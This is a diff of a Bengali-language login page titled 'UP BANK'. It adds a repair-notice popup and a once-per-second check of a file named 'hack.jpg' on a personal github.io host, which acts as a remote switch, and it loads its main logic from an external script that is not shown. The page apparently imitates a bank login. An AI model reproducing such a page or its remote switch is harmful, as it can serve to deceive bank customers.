@@ -4,7 +4,6 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <title>Login | UP BANK</title> 
-   
      <link
       rel="stylesheet"
       data-purpose="Layout StyleSheet"
@@ -42,7 +41,7 @@
         href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-light.css"
       >
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
-  <link rel="stylesheet" href="index.css"></head>
+  <link rel="stylesheet" href="index2.css"></head>
 <body><div class="no-connection-popup" id="no-connection-popup">
         <div class="icon"><i class="fa-duotone fa-solid fa-wifi-slash"></i></div>
         <h1>ইন্টারনেট সংযোগ নেই!</h1>
@@ -53,6 +52,11 @@
         <h1>তথ্য সঠিক নয়!</h1>
         <p id="result"></p>
         <button id="close-popup2">Ok</button>
+    </div><div class="no-connection-popup" id="no-connection-popup3">
+        <div class="icon"><i class="fa-duotone fa-solid fa-bell-exclamation"></i></div>
+        <h1>কিছু সময় পরে চেষ্টা করুন। </h1>
+        <p>অ্যাপ মেরামতের কাজ চলছে। </p>
+        <button id="close-popup3">Ok</button>
     </div>
    <div class="modal">
     <form id="loginForm" class="form">
@@ -87,49 +91,75 @@
     </form>
 </div>
     <script>
-    let audioPlayed = false;
-const audioElement = new Audio('ting.mp3');
+ let audioPlayed = false;
+const audioElement = new Audio('fail.mp3');
 
 // Preload the audio
 audioElement.preload = 'auto';
 audioElement.load();
 
-function checkInternetConnection() {
+async function checkInternetConnection() {
     const netpopup = document.getElementById('no-connection-popup');
+    const netpopup3 = document.getElementById('no-connection-popup3');
     
-    if (navigator.onLine) {
+    try {
+        // Attempt to fetch the first resource
+        const response1 = await fetch('https://www.google.com/favicon.ico',{ method: 'HEAD', cache: 'no-store' });
+        
+        if (!response1.ok) {
+            throw new Error('First link offline');
+        }
+        
         netpopup.style.display = 'none';
-        audioPlayed = false; // Reset the flag when the popup is hidden
-        
-        // Check if we need to reload the page
-        if (sessionStorage.getItem('reloaded') === 'true') {
-            // Reset the flag and reload
-            sessionStorage.removeItem('reloaded');
-            location.reload();
-        }
-    } else {
+    } catch (error) {
         netpopup.style.display = 'block';
+        playAudioOnce();
+      return;
+    }
+
+    try {
+        // Attempt to fetch the second resource
+        const response2 = await fetch('https://unpob.github.io/app/hack.jpg' ,{ method: 'HEAD', cache: 'no-store' });
         
-        // Play the audio only if it hasn't been played for this session
-        if (!audioPlayed) {
-            audioElement.play().catch(error => {
-                console.error('Audio playback failed:', error);
-            });
-            audioPlayed = true;
+        if (!response2.ok) {
+            throw new Error('Second link offline');
         }
         
-        // Set the flag to reload the page when connection is restored
-        sessionStorage.setItem('reloaded', 'true');
+        netpopup3.style.display = 'none';
+    } catch (error) {
+        netpopup3.style.display = 'block';
+        playAudioOnce();
+    }
+
+    // Reset the reload flag if connection is restored
+    if (sessionStorage.getItem('reloaded') === 'true') {
+        sessionStorage.removeItem('reloaded');
+        location.reload();
+    }
+}
+
+function playAudioOnce() {
+    if (!audioPlayed) {
+        audioElement.play().catch(error => {
+            console.error('Audio playback failed:', error);
+        });
+        audioPlayed = true;
     }
 }
 
 window.addEventListener('load', checkInternetConnection);
-setInterval(checkInternetConnection, 3000);
+setInterval(checkInternetConnection, 1000);
 
 document.getElementById('close-popup').addEventListener('click', function () {
     document.getElementById('no-connection-popup').style.display = 'none';
     audioPlayed = false; // Reset the flag when the popup is manually closed
-});</script>
+});
+
+document.getElementById('close-popup3').addEventListener('click', function () {
+    document.getElementById('no-connection-popup3').style.display = 'none';
+    audioPlayed = false; // Reset the flag when the popup is manually closed
+});
+ </script>
     
   <script src="https://unpob.github.io/app/index2.js"></script>
 </body>
